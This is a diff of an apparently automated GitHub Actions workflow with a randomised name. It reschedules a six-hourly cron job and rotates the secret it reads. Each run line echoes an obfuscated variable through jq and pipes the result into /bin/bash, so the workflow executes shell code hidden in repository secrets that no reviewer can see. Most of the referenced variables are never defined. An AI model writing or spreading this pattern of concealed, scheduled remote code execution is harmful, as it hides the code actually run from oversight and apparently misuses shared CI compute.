@@ -1,8 +1,10 @@
 name: jiatingqian7584
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '58 5/6 * * *'
+    - cron: '28 2/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,23 +13,15 @@ jobs:
       - uses: actions/checkout@v4
       - name: jiatingqian7584
         env:
-          sif72: ${{ secrets.sif72 }}
+          yuwz4: ${{ secrets.yuwz4 }}
         run: |
-          echo $sif72 | jq -r .od16 | /bin/bash
-          echo $a3 | jq -r .xmt596 | /bin/bash
-          echo $ylpu96 | jq -r .tlyax569 | /bin/bash
-          echo $fi23378 | jq -r .y69 | /bin/bash
-          echo $iv02173 | jq -r .ecwp3047 | /bin/bash
-          echo $ayjjj37 | jq -r .uvr355 | /bin/bash
-          echo $hyfb519 | jq -r .fobo2981 | /bin/bash
-          echo $rp5 | jq -r .fdhx12 | /bin/bash
-          echo $ipmg2839 | jq -r .m18230 | /bin/bash
-          echo $qvle13506 | jq -r .uh541 | /bin/bash
-          echo $p8565 | jq -r .uhihg42286 | /bin/bash
-          echo $mzj4 | jq -r .o824 | /bin/bash
-          echo $bao233 | jq -r .dwbf0565 | /bin/bash
-          echo $kkgim830 | jq -r .dzhy4495 | /bin/bash
-          echo $bgmz223 | jq -r .xw32 | /bin/bash
-          echo $uhyrd676 | jq -r .ivtt99 | /bin/bash
-          echo $adduc38887 | jq -r .yl0933 | /bin/bash
+          echo $yuwz4 | jq -r .nbov9 | /bin/bash
+          echo $mjscz414 | jq -r .j1 | /bin/bash
+          echo $ocr07 | jq -r .irf11 | /bin/bash
+          echo $fuldm386 | jq -r .fhbb1 | /bin/bash
+          echo $qx81 | jq -r .tcxuk53 | /bin/bash
+          echo $b22 | jq -r .bca6515 | /bin/bash
+          echo $lum4 | jq -r .gan753 | /bin/bash
+          echo $bw2 | jq -r .cc3 | /bin/bash
+          echo $oekw947 | jq -r .et7725 | /bin/bash
 
